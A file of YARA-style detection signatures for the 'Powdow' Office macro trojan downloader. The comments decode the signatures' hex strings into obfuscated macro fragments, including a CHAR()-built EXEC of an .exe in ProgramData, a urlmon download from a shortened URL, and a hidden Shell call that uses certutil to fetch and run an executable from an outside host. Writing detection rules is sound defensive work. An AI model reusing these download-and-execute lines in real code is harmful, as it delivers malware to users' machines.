
rule TrojanDownloader_O97M_Powdow_PD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_00_0 = {45 58 45 43 28 22 43 3a 5c 22 26 43 48 41 52 28 38 30 29 26 43 48 41 52 28 38 32 29 26 22 4f 47 52 41 4d 44 41 54 41 5c 61 2e 22 26 43 48 41 52 28 31 30 31 29 26 22 78 65 22 29 } //1 EXEC("C:\"&CHAR(80)&CHAR(82)&"OGRAMDATA\a."&CHAR(101)&"xe")
		$a_00_1 = {75 72 22 26 43 48 41 52 28 31 30 38 29 26 22 6d 6f 6e } //1 ur"&CHAR(108)&"mon
		$a_00_2 = {4a 4a 43 43 4a 4a } //1 JJCCJJ
		$a_00_3 = {43 48 41 52 28 31 30 34 29 26 22 74 74 70 3a 2f 2f 63 75 74 74 2e 6c 79 2f 75 68 6e 73 47 56 4b } //1 CHAR(104)&"ttp://cutt.ly/uhnsGVK
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1+(#a_00_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_PD_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 72 61 6e 64 6f 6d 31 2e 78 32 34 68 72 2e 63 6f 6d 2f 6b 2f 4f 6c 75 73 76 70 6e 2e 65 78 65 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://random1.x24hr.com/k/Olusvpn.exe"
		$a_03_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 90 02 1f 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 90 00 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1) >=2
 
}